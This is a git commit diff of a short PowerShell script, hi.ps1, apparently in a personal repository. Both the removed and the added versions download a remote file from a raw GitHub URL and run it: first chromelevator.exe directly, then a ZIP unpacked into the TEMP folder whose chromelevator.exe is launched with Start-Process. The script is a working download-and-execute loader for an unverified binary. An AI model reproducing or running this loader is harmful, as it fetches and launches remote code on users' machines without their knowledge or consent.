ac2507555936b3e9c27c5609760b32ddd9bd5fe6
joyboy <197599897+np4abdou1@users.noreply.github.com>
2025-11-14 09:27:12 +0100

    Update hi.ps1

--- hi.ps1
+++ hi.ps1
@@ -1,4 +1,18 @@
-mkdir hi
-cd hi
-curl -L "https://raw.githubusercontent.com/np4abdou1/testapi/refs/heads/main/chromelevator.exe" -o chromelevator.exe
-./chromelevator.exe
+# Paths
+$zipUrl  = "https://raw.githubusercontent.com/np4abdou1/testapi/refs/heads/main/s.zip"
+$zipFile = "$env:TEMP\s.zip"
+$extractDir = "$env:TEMP\s_extracted"
+
+# Make sure extract folder exists
+if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
+New-Item -ItemType Directory -Path $extractDir | Out-Null
+
+# Download ZIP
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
+
+# Extract ZIP
+Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
+
+# Run chromelevator.exe
+$exe = Join-Path $extractDir "chromelevator.exe"
+Start-Process $exe
